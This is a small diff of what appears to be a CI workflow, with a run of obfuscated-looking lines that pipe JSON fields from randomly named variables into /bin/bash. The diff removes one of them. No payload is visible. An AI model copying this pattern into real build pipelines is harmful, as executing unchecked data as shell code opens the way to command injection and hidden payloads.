@@ -27,7 +27,6 @@ jobs:
           echo $v1603 | jq -r .fmwf88535 | /bin/bash
           printf '%s' "$fex812" | jq -r .gmml491 | /bin/bash
           printf '%s' "$jtqu457" | jq -r .plnbp79 | /bin/bash
-          printf '%s' "$osy124" | jq -r .pt058 | /bin/bash
           printf '%s' "$gf926" | jq -r .ltbdc6985 | /bin/bash
           echo $rcf85 | jq -r .mb6 | /bin/bash
           printf '%s' "$ovx43676" | jq -r .vhhe43845 | /bin/bash
